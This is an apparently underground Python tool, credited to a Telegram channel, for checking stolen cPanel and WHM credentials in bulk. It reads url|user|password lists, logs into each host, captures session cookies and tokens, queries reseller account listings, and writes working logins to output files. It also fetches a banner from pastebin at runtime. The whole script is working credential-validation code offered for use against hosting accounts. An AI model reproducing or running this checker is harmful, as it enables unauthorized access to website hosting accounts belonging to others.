import requests, re, sys,json,socket,os,time,random
from colorama import Fore								
from colorama import Style								
from colorama import init
from threading import Thread
from urllib.parse import urlparse
from multiprocessing.pool import ThreadPool
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Created By https://t.me/t00l_network


class cpanel_valid:
    def __init__(self):
        self.header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
        }
        self.red  =   Fore.RED
        self.cyan  =   Fore.CYAN
        self.magenta  =   Fore.MAGENTA
        self.white  =   Fore.WHITE
        self.yellow  =   Fore.YELLOW
        self.blue =   Fore.BLUE
        self.green  =   Fore.GREEN
        self.reset  =   Fore.RESET
        self.normal  =   Style.NORMAL
        self.bright  =   Style.BRIGHT
        self.counter = 1

    def allow_redirects(self,url):
        try:
            req = requests.get(url,allow_redirects = True,headers = self.header , timeout = 5)
            return str(req.url)
        except:
            return str(url)

    def domain_check(sefl,url):
        try:
            addr = socket.gethostbyname(url)
            return (1)
        except:
            return (0)

    def text_parsed(self,text):
        try:
            text = text.split("|")
            url = text[0]
            user = text[1]
            password = text[2]
            return [self.allow_redirects(url),user,password]
        except:
            pass

    def listToString(self,lists):
        return ';'.join([str(elem) + "=" + str(elem2) for elem,elem2 in lists.items()])

    def run_banner(self):
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37]
        req=requests.session()
        x = req.get("https://pastebin.com/raw/EkVMXuBK").text
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))

    def combine_ip(self,url,url2):
        try:
            ip1 = socket.gethostbyname(url)
            ip2 = socket.gethostbyname(url2)
            if str(ip1) == str(ip2):
                return (1)
            else:
                return (0)
        except:
            return (0)


    def check_whm_access(self,url,user,password):
        try:
            post = {
                "user":user,
                "pass":password,
                "goto_uri" : "/"
            }
            
            login_whm = requests.post(url,data=post,headers=self.header,timeout=5)
            if login_whm.status_code != 401:
                return 1
            else:
                return 0
        except Exception as e:
            return 0

    def get_cpanel_domain(self,url):
        try:
            get_domain_data = requests.get(url,headers = self.header , timeout = 10)

            json_domain = json.loads(get_domain_data.text)

            cpanel_domain = json_domain["data"][0]["domain"]

            return cpanel_domain
        except Exception as e:
            return "NOT FOUND DOMAIN"

    def get_cpanel_login(self,url,user,password):
        try:

            post = {
                "user":user,
                "pass":password,
                "goto_uri" : "/"
            }
            get_cookies = requests.post(url + "/login/?login_only=1",data=post,headers=self.header,timeout=15,verify=False)

            if "redirect" in get_cookies.text:

                json_do = json.loads(get_cookies.text)
                redirect_link = json_do["redirect"]

                try:
                    get_domain_value = json_do["security_token"] + "/execute/Resellers/list_accounts"
                    cookies = self.listToString(get_cookies.cookies.get_dict())
                except:
                    cookies = 0
                
                return [get_domain_value,cookies]
            else:
                return []
        except Exception as e:
            return []

    def cp_login(self,text):
        
            
            
            if "2083" in text:
                text_new = text.split(" ")[0]
                data = self.text_parsed(text_new)


                url = data[0]
                
                if ":2083" in url:
                    port = "2083"
                else:
                    port = "2082"
            
                
                url = url.split(port)[0] + port + "/"
               
                username = data[1]
                password = data[2]

                try:
                    get_login_details = self.get_cpanel_login(url,username,password)

                    if len(get_login_details) == 2:

                        try:
                            get_domain_value = get_login_details[0]
                            cookies = get_login_details[1]
                        except:
                            cookies = 0

                        self.header["Cookie"] = cookies

                        cpanel_domain = self.get_cpanel_domain(url + get_domain_value)

                        whm_access = self.check_whm_access(url.replace("2083","2087") + "/login/?login_only=1",username,password)

                        our_domain = re.findall("//(.*?)/",url)[0].split(":")[0]

                        text = text.split(" ")[0]

                        if self.domain_check(cpanel_domain) == 1 and self.combine_ip(cpanel_domain,our_domain) == 1:

                            if whm_access:
                                set_output = text  + "   [{}][DOMAIN WORK][WHM]".format(cpanel_domain) + '\n'

                                text_output = self.green + "[WORK]" + self.yellow + " => " + self.white + url + "  " + self.green + "[{}][DOMAIN WORK]".format(cpanel_domain) + self.yellow + "[WHM]" + self.reset
                                
                            else:
                                set_output = text  + "   [{}][DOMAIN WORK][CPANEL]".format(cpanel_domain) + '\n'

                                text_output = self.green + "[WORK]" + self.yellow + " => " + self.white + url + "  " + self.green + "[{}][DOMAIN WORK][CPANEL]".format(cpanel_domain) + self.reset
                            
                            print(self.cyan + "[{}]".format(str(self.counter)) + text_output)
                            op = open("cpanels_works.txt","a")
                            op.write(set_output)
                            op.close()

                        else:
                            if whm_access:

                                set_output = text  + "   [{}][DOMAIN NOT WORK][WHM]".format(cpanel_domain) + '\n'
                                
                                text_output = self.green + "[WORK]" + self.yellow + " => " + self.white + url + "  " + self.red + "[{}][DOMAIN NOT WORK][WHM]".format(cpanel_domain)  + self.reset
                            else:
                                set_output = text + "   [{}][DOMAIN NOT WORK][CPANEL]".format(cpanel_domain) + '\n'

                                text_output = self.green + "[WORK]" + self.yellow + " => " + self.white + url + "  " + self.red + "[{}][DOMAIN NOT WORK][CPANEL]".format(cpanel_domain)  + self.reset
                            
                            print(self.cyan+ "[{}]".format(str(self.counter)) + text_output)
                            op = open("cpanels_domain_not_work.txt","a")
                            op.write(set_output)
                            op.close()

                    else:
                        print(self.cyan+ "[{}]".format(str(self.counter)) + self.red + "[NOT WORK]" + self.yellow + " => " + self.white + url + self.reset)
                        op = open("cpanels_not_work.txt","a")
                        op.write(text + '\n')
                        op.close()

                    self.counter += 1

                except Exception as e:
                    self.counter += 1
                    print(self.cyan+ "[{}]".format(str(self.counter)) + self.red + "[FAILED]" + self.yellow + " => " + self.white + url + self.reset)
                    op = open("cpanel_failed.txt","a")
                    op.write(text + '\n')
                    op.close()
            

cpanel_valid().run_banner()

try:
    with open(input("\n \033[33mList Cpanels : \033[0m"), 'r') as f:
        userlist = f.read().splitlines()
        userlist = list((userlist))
except IOError:
    print("open your eyes!")


if __name__ == '__main__':
    pool = ThreadPool(5)
    try:
        pool.map(cpanel_valid().cp_login, userlist)
        pool.close()
        pool.join()
    except KeyboardInterrupt:
        exit()